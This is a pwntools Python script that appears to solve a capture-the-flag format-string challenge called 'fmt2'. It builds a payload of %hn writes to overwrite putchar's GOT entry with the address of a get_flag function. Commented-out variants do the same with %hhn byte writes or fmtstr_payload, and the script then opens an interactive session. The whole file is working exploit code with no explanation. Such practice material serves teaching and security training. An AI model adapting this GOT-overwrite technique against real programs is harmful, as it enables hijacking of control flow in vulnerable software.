#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./fmt2", checksec = False)
p = process(exe.path)

putchar = 0x404018
get_flag = 0x401349

payload  = b'A'*112
payload += f'%{0x1349}c%22$hn'.encode()
payload += b'A' * 4
payload += p64(0x404018)

##############################################################################

# payload  = b'A'*112
# payload += f'%73c%23$hhn'.encode()
# payload += f'%202c%24$hhn'.encode()
# payload += b'A'
# payload += p64(0x404018)
# payload += p64(0x404019) 

##############################################################################

# payload = b'A'*112
# payload += fmtstr_payload(20,{putchar : get_flag})

# assert(len(payload) < (0x158 - 0x78))

# log.info("Payload: " + str(payload))

p.sendlineafter(b'have?\n',payload)
p.sendlineafter(b'data\n',b'')
p.interactive()